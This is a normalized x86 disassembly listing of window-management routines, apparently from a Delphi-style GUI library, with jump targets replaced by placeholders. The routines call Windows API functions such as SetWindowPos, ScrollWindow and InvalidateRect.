lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_448494
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44eda0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_44c00c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44bfd0
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_40348c
inc edi
dec ebx
jne r-xdata
sub_44ede8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44bb74
xor eax eax
push ebp
push sub_44ee86
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44eda0
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448710
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee8d
mov eax [ ebp - 0x4 ]
call sub_44bb7c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44ee94
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44bb9c
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44bfd0
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_44ef84
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41836c
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_418200
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41838c
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_418310
call sub_44f2dc
jmp r-xdata
mov eax ebp
mov edx esi
call sub_418310
call sub_44f2dc
sub_44f05c
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_44ef84
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_44f0bc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_44f2dc
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
test eax eax
jne r-xdata
sub_44f120
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_449ca8
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43936c
call sub_43944c
test al al
je r-xdata
mov eax ebx
call sub_44c00c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44bfd0
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44bfd0
test [ eax + 0x52 ] 0x4
je r-xdata
sub_44f1e4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_448494
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_44f21c
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_45f870
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_44f25c
push ebx
mov ebx eax
mov eax ebx
call sub_45f870
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_4635dc
pop ebx
retn
mov eax ebx
call sub_45f898
mov eax ebx
call sub_44f2dc
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_44f294
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f2b8
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_44f2b8
sub_44f2f0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_416cd4
mov eax edi
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44bfd0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_44f384
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_44f2dc
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_44f3bc
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_40348c
sub_44f478
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41836c
pop esi
pop ebx
retn
sub_44f49c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f478
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_418200
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41838c
sub_44f510
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_44f5e0
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_449ca8
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44f570
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44f5d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f5db
lea eax [ ebp - 0x4 ]
call sub_405874
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_40348c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_40588c
sub_44f5ec
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_448148
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44f6a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_418310
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_4181b4
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_40348c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_44f704
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44f7fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_40348c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f801
mov eax [ ebp - 0x14 ]
call sub_403290
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41836c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418310
mov edi eax
mov eax edi
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_44f810
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_44f704
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44f83c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45f870
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44f704
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44f704
mov edx eax
mov eax esi
call sub_4634dc
sub_44f880
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44f8c8
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44ef84
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_448d64
sub_44f910
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44f994
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_44f5e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_44c00c
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_44fd56
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_44c00c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_44f910
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44bfd0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_44fd70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
